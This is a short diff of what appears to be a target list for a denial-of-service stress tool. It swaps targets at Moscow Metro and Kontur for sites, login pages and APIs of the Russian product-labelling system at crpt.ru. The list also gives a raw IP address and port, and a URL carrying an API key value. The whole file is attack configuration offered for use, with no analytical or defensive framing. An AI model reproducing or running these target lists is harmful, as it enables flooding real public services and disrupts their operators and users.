@@ -1,13 +1,11 @@
-http://nnoblsud.ru https://mosmetro.ru  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/  -t 3000 --rpc 3000 --http-methods GET STRESS --debug
 
-https://job.mosmetro.ru https://mis.mosmetro.ru/login.php  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+https://ismp.crpt.ru https://edo-gismt.crpt.ru/ https://suzgrid.crpt.ru/login  -t 3000 --rpc 3000 --http-methods GET STRESS --debug
 
-https://app-bucket.mosmetro.ru https://shop.mosmetro.ru  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+http://api.mdlp.crpt.ru http://kb.crpt.ru http://suz2.crpt.ru  -t 3000 --rpc 3000 --http-methods GET STRESS --debug
 
-https://elba.kontur.ru/AccessControl/Login https://auth.kontur.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+http://nrz.api.sb.mdlp.crpt.ru http://api.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru  -t 3000 --rpc 3000 --http-methods GET STRESS --debug
 
-https://api.kontur.ru/csi/support/v1/public/integrations/zakupki https://focus-api.kontur.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+https://честныйзнак.рф/potrebitelyam/ https://апи.национальный-каталог.рф/ -t 3000 --rpc 3000 --http-methods GET STRESS --debug
 
-https://developer.kontur.ru/ https://cabinet.kontur.ru/ https://www.kontur-extern.ru/  GET STRESS -t 2000 --rpc 2000 -p 1200 --table
-
-https://edi-api.kontur.ru https://evrika.kontur.ru --http-methods GET STRESS -t 2000 --rpc 2000 -p 1200 --table
+https://xn--80aqu.xn----7sbabas4ajkhfocclk9d3cvfsa.xn--p1ai/v3/feed-product?apikey=6A9769C235F432 tcp://91.230.251.101:443 -t 3000 --rpc 3000 --http-methods GET STRESS --debug
